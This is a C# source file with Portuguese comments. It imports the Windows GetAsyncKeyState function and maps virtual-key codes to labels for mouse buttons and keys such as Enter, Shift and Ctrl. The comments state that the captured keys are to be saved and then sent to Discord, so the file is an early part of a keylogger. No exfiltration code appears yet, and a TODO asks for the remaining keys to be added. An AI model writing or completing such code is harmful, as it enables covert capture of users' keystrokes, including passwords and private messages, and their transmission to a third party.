using System.Runtime.InteropServices;

namespace CastApp
{
    class Natives
    {
        // Importacao da Api do Windows user32.dll importamos uma funcao chamada GetAsyncKeyState() basicamente ela retorna o valor Decimal de uma Tecla 
        // tem o site da microsoft que nos da os codigos hex das teclas apenas temos que converter o Hex para decimal 

        // Site Microsoft: https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // Site para converter: https://www.rapidtables.com/convert/number/hex-to-decimal.html
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        // Criei esta funcao para ser usada no futuro quando pegarmos a tecla precionada verificamos a que tecla corresponde e depois 
        // apenas temos que guardar em um arquivo ou variavel para mandar logo para o Discord fica a vosso criterio
        // TODO
        // Adicionar o resto das teclas
        public string TeclaPrecionada(int intcode)
        {
            string teclaPrecionada = string.Empty;

            if (intcode == 1) teclaPrecionada = "[Btn Esquerdo do Rato]";
            else if (intcode == 2) teclaPrecionada = "[Btn Direito do Rato]";
            else if (intcode == 4) teclaPrecionada = "[Scroll do Rato]";
            else if (intcode == 8) teclaPrecionada = "[Backspace]";
            else if (intcode == 9) teclaPrecionada = "[Tab]";
            else if (intcode == 13) teclaPrecionada = "[Enter]";
            else if (intcode == 16) teclaPrecionada = "[Shift]";
            else if (intcode == 17) teclaPrecionada = "[Ctrl]";
            else if (intcode == 18) teclaPrecionada = "[Alt]";
            else if (intcode == 19) teclaPrecionada = "[Pause]";
            else if (intcode == 20) teclaPrecionada = "[Caps Lock]";
            else if (intcode == 27) teclaPrecionada = "[Esc]";
            else if (intcode == 32) teclaPrecionada = "[Spacebar]";
            else if (intcode == 33) teclaPrecionada = "[PageUp]";
            else if (intcode == 34) teclaPrecionada = "[PageDown]";
            else if (intcode == 35) teclaPrecionada = "[End]";
            else if (intcode == 36) teclaPrecionada = "[Home]";

            return teclaPrecionada;
        }
    }
}
